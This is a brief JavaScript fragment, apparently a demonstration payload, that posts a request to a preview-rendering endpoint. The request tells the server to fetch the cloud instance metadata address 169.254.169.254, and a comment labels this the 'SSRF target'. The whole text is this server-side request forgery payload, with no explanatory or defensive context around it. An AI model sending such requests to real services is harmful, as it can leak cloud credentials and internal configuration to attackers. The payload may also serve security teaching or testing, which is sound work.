fetch("/api/render-preview", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ url: "http://169.254.169.254/latest/meta-data/" }) // SSRF target!
});
